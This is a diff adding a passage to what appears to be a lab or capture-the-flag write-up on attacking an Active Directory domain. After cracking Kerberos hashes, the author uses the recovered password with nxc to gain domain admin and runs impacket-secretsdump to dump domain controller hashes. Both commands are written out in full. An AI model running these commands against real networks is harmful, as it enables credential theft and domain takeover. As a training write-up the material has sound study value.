@@ -95,4 +95,17 @@ Now that i got the kereberos hashes it was time to crack them with hashcat.
 
 <img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
 
+With my new credentials, i went ahead and ran nxc again to see what i could do with them.
 
+    nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u peggy -p password2
+    
+<img width="805" height="412" alt="Screenshot 2025-12-04 014258" src="https://github.com/user-attachments/assets/5b20ed1d-55cb-478a-becd-4ea188974875" />
+
+This was good news, The pwned text meant that my account had some sort of admin and in this case, my new account was a domain admin. 
+
+
+Using my new credentials, i dumped the 
+
+    impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214 -just-dc
+
+<img width="867" height="229" alt="image" src="https://github.com/user-attachments/assets/de9afc0e-679a-42a3-a264-e61782918247" />
